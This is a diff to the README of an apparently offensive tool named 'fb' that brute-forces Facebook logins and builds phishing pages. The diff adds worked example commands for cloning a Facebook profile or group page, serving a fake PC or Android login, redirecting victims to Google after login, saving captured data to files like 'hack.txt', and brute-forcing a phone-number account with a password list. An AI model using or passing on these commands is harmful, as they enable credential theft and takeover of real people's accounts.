@@ -34,23 +34,23 @@ type :
 
   -h [for List all commands]
 
-  -b [-b refer for bruteforce attack]
+  -b [-b reffer for bruteforce attack]
 
-  -p [-p refer for phising attack]
+  -p [-p reffer for phising attack]
 
   -d [it is use to list the path of the world list]
 
-  -u [it refer for username]
+  -u [it reffer for username]
 
-  -i [it refer for ip address]
+  -i [it reffer for ip address]
 
-  -r [it refer for port]
+  -r [it reffer for port]
 
-  -v [it refer for version pc/android]
+  -v [it reffer for version pc/android]
 
   -o [Set output file path and name in .txt format]
 
-  -f [it refer for html file]
+  -f [it reffer for url with wich you wont to buind]
 
   -j [url which shuld open after login]
 
@@ -60,15 +60,34 @@ Usage :
 
 for bruteforce attack : 
 
-./fb -b -u [username] -d [path of file]
+$ ./fb -b -u [username] -d [path of file]
 
 for phising :
 
-./fb -p -v [version pc/android] -i [ip address] -r [port] -f [ html file path ] -j [url after redirection] -o [output file name and path]
+$ ./fb -p -v [version pc/android] -i [ip address] -r [port] -j [url after redirection] -o [output file name and path]
+
+e.g suppose that version is android and ip is 127.0.0.1 and port is 8080 and after login your wont to redirest victim to www.google.com and ooutput file is data.txt
 
 for reset :
 
-./fb -r
+$ ./fb -r
+
+for making a phising page and buind it 
+
+$ ./fb -p -v [version pc/android] -f [url of facebook profile or group] -j [redirect url after login] -o [outputfile path]
+
+e.g suppose ip > 127.0.0.1 port > 8080 in phising and version is android and redirect to google and output file is data.txt and your are buinding it with https://www.facebook.com/group/
+
+$ ./fb -p -v android -i 127.0.0.1 -r 8080 -j https://www.google.com -f https://www.facebook.com/group/ -o data.txt
+
+or suppose in port forwording output file is hack.txt and redirecting after login to google for pc
+
+$ ./fb -p -v pc -j https://www.google.com -o hack.txt
+
+in bruteforce attack suppose number is 123456789 and password file is pass.txt
+
+$ ./fb -b -u 123456789 -d pass.txt
+
 ```
 # Description
 
